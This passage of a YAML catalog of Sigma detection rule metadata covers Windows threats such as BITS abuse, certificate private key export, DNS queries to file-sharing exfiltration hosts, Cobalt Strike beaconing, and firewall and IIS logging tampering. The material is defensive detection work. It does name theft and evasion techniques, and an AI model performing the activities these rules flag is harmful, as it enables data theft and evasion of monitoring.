  platform: windows
  product: bits-client
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md
  - https://twitter.com/malmoeb/status/1535142803075960832
  false_positives:
  - This rule doesn't exclude other known TLDs such as ".org" or ".net". It's recommended
    to apply additional filters for software and scripts that leverage the BITS service
  notes: ''
- detection_id: f8a56cb7-a363-44ed-a82f-5926bb44cd05
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/bits_client/win_bits_client_new_trasnfer_susp_local_folder.yml
  name: BITS Transfer Job Download To Potential Suspicious Folder
  description: Detects new BITS transfer job where the LocalName/Saved file is stored
    in a potentially suspicious location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: bits-client
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1197
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: e2b5163d-7deb-4566-9af3-40afea6858c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/capi2/win_capi2_acquire_certificate_private_key.yml
  name: Certificate Private Key Acquired
  description: Detects when an application acquires a certificate private key
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: capi2
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1649
  tags:
  - attack.credential-access
  - attack.t1649
  time_window: ''
  references:
  - https://www.splunk.com/en_us/blog/security/breaking-the-chain-defending-against-certificate-services-abuse.html
  false_positives:
  - Legitimate application requesting certificate exports will trigger this. Apply
    additional filters as needed
  notes: ''
- detection_id: 58c0bff0-40a0-46e8-b5e8-b734b84d2017
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/certificate_services_client_lifecycle_system/win_certificateservicesclient_lifecycle_system_cert_exported.yml
  name: Certificate Exported From Local Certificate Store
  description: Detects when an application exports a certificate (and potentially
    the private key as well) from the local Windows certificate store.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: certificateservicesclient-lifecycle-system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1649
  tags:
  - attack.credential-access
  - attack.t1649
  time_window: ''
  references:
  - https://www.splunk.com/en_us/blog/security/breaking-the-chain-defending-against-certificate-services-abuse.html
  false_positives:
  - Legitimate application requesting certificate exports will trigger this. Apply
    additional filters as needed
  notes: ''
- detection_id: f8931561-97f5-4c46-907f-0a4a592e47a7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/code_integrity/win_codeintegrity_attempted_dll_load.yml
  name: CodeIntegrity - Unmet Signing Level Requirements By File Under Validation
  description: 'Detects attempted file load events that did not meet the signing level
    requirements. It often means the file''s signature is revoked or a signature with
    the Lifetime Signing EKU has expired.

    This event is best correlated with EID 3089 to determine the error of the validation.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - multi_signal_correlation
  severity: low
  status: experimental
  platform: windows
  product: codeintegrity-operational
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1483810148602814466
  - https://github.com/MicrosoftDocs/windows-itpro-docs/blob/40fe118976734578f83e5e839b9c63ae7a4af82d/windows/security/threat-protection/windows-defender-application-control/event-id-explanations.md#windows-codeintegrity-operational-log
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-tag-explanations
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-id-explanations
  false_positives:
  - Antivirus and other third party products are known to trigger this rule quite
    a lot. Initial filters and tuning is required before using this rule.
  notes: ''
- detection_id: 5daf11c3-022b-4969-adb9-365e6c078c7c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/code_integrity/win_codeintegrity_blocked_protected_process_file.yml
  name: CodeIntegrity - Disallowed File For Protected Processes Has Been Blocked
  description: Detects block events for files that are disallowed by code integrity
    for protected processes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: codeintegrity-operational
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-id-explanations
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-tag-explanations
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e4be5675-4a53-426a-8c81-a8bb2387e947
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/code_integrity/win_codeintegrity_enforced_policy_block.yml
  name: CodeIntegrity - Blocked Image/Driver Load For Policy Violation
  description: Detects blocked load events that did not meet the authenticode signing
    level requirements or violated the code integrity policy.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: codeintegrity-operational
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543
  time_window: ''
  references:
  - https://twitter.com/wdormann/status/1590434950335320065
  - https://github.com/MicrosoftDocs/windows-itpro-docs/blob/40fe118976734578f83e5e839b9c63ae7a4af82d/windows/security/threat-protection/windows-defender-application-control/event-id-explanations.md#windows-codeintegrity-operational-log
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-id-explanations
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9b72b82d-f1c5-4632-b589-187159bc6ec1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/code_integrity/win_codeintegrity_revoked_driver_blocked.yml
  name: CodeIntegrity - Blocked Driver Load With Revoked Certificate
  description: Detects blocked load attempts of revoked drivers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: codeintegrity-operational
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-id-explanations
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-tag-explanations
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 320fccbf-5e32-4101-82b8-2679c5f007c6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/code_integrity/win_codeintegrity_revoked_driver_loaded.yml
  name: CodeIntegrity - Revoked Kernel Driver Loaded
  description: Detects the load of a revoked kernel driver
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: codeintegrity-operational
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-id-explanations
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-tag-explanations
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 6f156c48-3894-4952-baf0-16193e9067d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/code_integrity/win_codeintegrity_revoked_image_blocked.yml
  name: CodeIntegrity - Blocked Image Load With Revoked Certificate
  description: Detects blocked image load events with revoked certificates by code
    integrity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: codeintegrity-operational
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-id-explanations
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-tag-explanations
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 881b7725-47cc-4055-8000-425823344c59
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/code_integrity/win_codeintegrity_revoked_image_loaded.yml
  name: CodeIntegrity - Revoked Image Loaded
  description: Detects image load events with revoked certificates by code integrity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: codeintegrity-operational
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-id-explanations
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-tag-explanations
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 951f8d29-f2f6-48a7-859f-0673ff105e6f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/code_integrity/win_codeintegrity_unsigned_driver_loaded.yml
  name: CodeIntegrity - Unsigned Kernel Module Loaded
  description: Detects the presence of a loaded unsigned kernel module on the system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: codeintegrity-operational
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-id-explanations
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-tag-explanations
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c92c24e7-f595-493f-9c98-53d5142f5c18
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/code_integrity/win_codeintegrity_unsigned_image_loaded.yml
  name: CodeIntegrity - Unsigned Image Loaded
  description: Detects loaded unsigned image on the system
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: codeintegrity-operational
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-id-explanations
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-tag-explanations
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 2f8cd7a0-9d5a-4f62-9f8b-2c951aa0dd1f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/code_integrity/win_codeintegrity_whql_failure.yml
  name: CodeIntegrity - Unmet WHQL Requirements For Loaded Kernel Module
  description: Detects loaded kernel modules that did not meet the WHQL signing requirements.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: codeintegrity-operational
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-id-explanations
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/operations/event-tag-explanations
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 50cb47b8-2c33-4b23-a2e9-4600657d9746
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/diagnosis/scripted/win_diagnosis_scripted_load_remote_diagcab.yml
  name: Loading Diagcab Package From Remote Path
  description: Detects loading of diagcab packages from a remote path, as seen in
    DogWalk vulnerability
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: diagnosis-scripted
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://twitter.com/nas_bench/status/1539679555908141061
  - https://twitter.com/j00sean/status/1537750439701225472
  false_positives:
  - Legitimate package hosted on a known and authorized remote location
  notes: ''
- detection_id: 29f171d7-aa47-42c7-9c7b-3c87938164d9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/dns_client/win_dns_client_anonymfiles_com.yml
  name: DNS Query for Anonfiles.com Domain - DNS Client
  description: Detects DNS queries for anonfiles.com, which is an anonymous file upload
    platform often used for malicious purposes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: dns-client
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1567.002
  time_window: ''
  references:
  - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbyte
  false_positives:
  - Rare legitimate access to anonfiles.com
  notes: ''
- detection_id: 0d18728b-f5bf-4381-9dcf-915539fff6c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/dns_client/win_dns_client_mal_cobaltstrike.yml
  name: Suspicious Cobalt Strike DNS Beaconing - DNS Client
  description: Detects a program that invoked suspicious DNS queries known from Cobalt
    Strike beacons
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: dns-client
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1071.004
  tags:
  - attack.t1071.004
  - attack.command-and-control
  time_window: ''
  references:
  - https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns
  - https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 66474410-b883-415f-9f8d-75345a0a66a6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/dns_client/win_dns_client_mega_nz.yml
  name: DNS Query To MEGA Hosting Website - DNS Client
  description: Detects DNS queries for subdomains related to MEGA sharing website
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: dns-client
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1567.002
  time_window: ''
  references:
  - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/
  false_positives:
  - Legitimate DNS queries and usage of Mega
  notes: ''
- detection_id: 8b69fd42-9dad-4674-abef-7fdef43ef92a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/dns_client/win_dns_client_put_io.yml
  name: DNS Query To Put.io - DNS Client
  description: Detects DNS queries for subdomains related to "Put.io" sharing website.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: dns-client
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  time_window: ''
  references:
  - https://darkatlas.io/blog/medusa-ransomware-group-opsec-failure
  false_positives:
  - Legitimate DNS queries and usage of Put.io
  notes: ''
- detection_id: 8384bd26-bde6-4da9-8e5d-4174a7a47ca2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/dns_client/win_dns_client_tor_onion.yml
  name: Query Tor Onion Address - DNS Client
  description: Detects DNS resolution of an .onion address related to Tor routing
    networks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: dns-client
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1090.003
  tags:
  - attack.command-and-control
  - attack.t1090.003
  time_window: ''
  references:
  - https://www.logpoint.com/en/blog/detecting-tor-use-with-logpoint/
  - https://github.com/Azure/Azure-Sentinel/blob/f99542b94afe0ad2f19a82cc08262e7ac8e1428e/Detections/ASimDNS/imDNS_TorProxies.yaml
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 090ffaad-c01a-4879-850c-6d57da98452d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/dns_client/win_dns_client_ufile_io.yml
  name: DNS Query To Ufile.io - DNS Client
  description: Detects DNS queries to "ufile.io", which was seen abused by malware
    and threat actors as a method for data exfiltration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: dns-client
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1567.002
  time_window: ''
  references:
  - https://thedfirreport.com/2021/12/13/diavol-ransomware/
  false_positives:
  - DNS queries for "ufile" are not malicious by nature necessarily. Investigate the
    source to determine the necessary actions to take
  notes: ''
- detection_id: 6d444368-6da1-43fe-b2fc-44202430480e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/dns_server/win_dns_server_failed_dns_zone_transfer.yml
  name: Failed DNS Zone Transfer
  description: Detects when a DNS zone transfer failed.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: dns-server
  category: ''
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1590.002
  tags:
  - attack.reconnaissance
  - attack.t1590.002
  time_window: ''
  references:
  - https://kb.eventtracker.com/evtpass/evtpages/EventId_6004_Microsoft-Windows-DNS-Server-Service_65410.asp
  false_positives:
  - Unlikely
  notes: ''
- detection_id: cbe51394-cd93-4473-b555-edf0144952d9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/dns_server/win_dns_server_susp_server_level_plugin_dll.yml
  name: DNS Server Error Failed Loading the ServerLevelPluginDLL
  description: Detects a DNS server error in which a specified plugin DLL (in registry)
    could not be loaded
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: dns-server
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
  - https://technet.microsoft.com/en-us/library/cc735829(v=ws.10).aspx
  - https://twitter.com/gentilkiwi/status/861641945944391680
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1a4bd6e3-4c6e-405d-a9a3-53a116e341d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/driverframeworks/win_usb_device_plugged.yml
  name: USB Device Plugged
  description: Detects plugged/unplugged USB devices
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: driver-framework
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1200
  tags:
  - attack.initial-access
  - attack.t1200
  time_window: ''
  references:
  - https://df-stream.com/2014/01/the-windows-7-event-log-and-usb-device/
  - https://www.techrepublic.com/article/how-to-track-down-usb-flash-drive-usage-in-windows-10s-event-viewer/
  false_positives:
  - Legitimate administrative activity
  notes: ''
- detection_id: cde0a575-7d3d-4a49-9817-b8004a7bf105
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/firewall_as/win_firewall_as_add_rule.yml
  name: Uncommon New Firewall Rule Added In Windows Firewall Exception List
  description: Detects when a rule has been added to the Windows Firewall exception
    list
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: firewall-as
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)
  false_positives: []
  notes: ''
- detection_id: 9e2575e7-2cb9-4da1-adc8-ed94221dca5e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/firewall_as/win_firewall_as_add_rule_susp_folder.yml
  name: New Firewall Rule Added In Windows Firewall Exception List For Potential Suspicious
    Application
  description: Detects the addition of a new rule to the Windows Firewall exception
    list for an application located in a potentially suspicious location.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: firewall-as
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)
  - https://app.any.run/tasks/7123e948-c91e-49e0-a813-00e8d72ab393/#
  false_positives:
  - Unknown
  notes: ''
- detection_id: eca81e8d-09e1-4d04-8614-c91f44fd0519
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/firewall_as/win_firewall_as_add_rule_wmiprvse.yml
  name: New Firewall Rule Added In Windows Firewall Exception List Via WmiPrvSE.EXE
  description: 'Detects the addition of a new "Allow" firewall rule by the WMI process
    (WmiPrvSE.EXE).

    This can occur if an attacker leverages PowerShell cmdlets such as "New-NetFirewallRule",
    or directly uses WMI CIM classes such as "MSFT_NetFirewallRule".

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: firewall-as
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-24---set-a-firewall-rule-using-new-netfirewallrule
  - https://malware.news/t/the-rhysida-ransomware-activity-analysis-and-ties-to-vice-society/72170
  - https://cybersecuritynews.com/rhysida-ransomware-attacking-windows/
  false_positives:
  - Administrator scripts or activity.
  notes: ''
- detection_id: 79609c82-a488-426e-abcf-9f341a39365d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/firewall_as/win_firewall_as_delete_all_rules.yml
  name: All Rules Have Been Deleted From The Windows Firewall Configuration
  description: Detects when a all the rules have been deleted from the Windows Defender
    Firewall configuration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: firewall-as
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)
  false_positives: []
  notes: ''
- detection_id: c187c075-bb3e-4c62-b4fa-beae0ffc211f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/firewall_as/win_firewall_as_delete_rule.yml
  name: A Rule Has Been Deleted From The Windows Firewall Exception List
  description: Detects when a single rules or all of the rules have been deleted from
    the Windows Defender Firewall
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: firewall-as
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)
  false_positives: []
  notes: ''
- detection_id: 7ec15688-fd24-4177-ba43-1a950537ee39
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/firewall_as/win_firewall_as_failed_load_gpo.yml
  name: The Windows Defender Firewall Service Failed To Load Group Policy
  description: Detects activity when The Windows Defender Firewall service failed
    to load Group Policy
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: firewall-as
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)
  false_positives: []
  notes: ''
- detection_id: 04b60639-39c0-412a-9fbe-e82499c881a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/firewall_as/win_firewall_as_reset_config.yml
  name: Windows Defender Firewall Has Been Reset To Its Default Configuration
  description: Detects activity when Windows Defender Firewall has been reset to its
    default configuration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: firewall-as
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)
  false_positives: []
  notes: ''
- detection_id: 00bb5bd5-1379-4fcf-a965-a5b6f7478064
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/firewall_as/win_firewall_as_setting_change.yml
  name: Windows Firewall Settings Have Been Changed
  description: Detects activity when the settings of the Windows firewall have been
    changed
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: firewall-as
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.004
  tags:
  - attack.defense-evasion
  - attack.t1562.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd364427(v=ws.10)
  false_positives: []
  notes: ''
- detection_id: a5b40a90-baf5-4bf7-a6f7-373494881d22
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/iis-configuration/win_iis_logging_etw_disabled.yml
  name: ETW Logging/Processing Option Disabled On IIS Server
  description: Detects changes to of the IIS server configuration in order to disable/remove
    the ETW logging/processing option.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: iis-configuration
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.004
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1562.002
  - attack.t1505.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/configure-logging-in-iis
  - https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/
  - https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/logfile/
  false_positives:
  - Legitimate administrator activity
  notes: ''
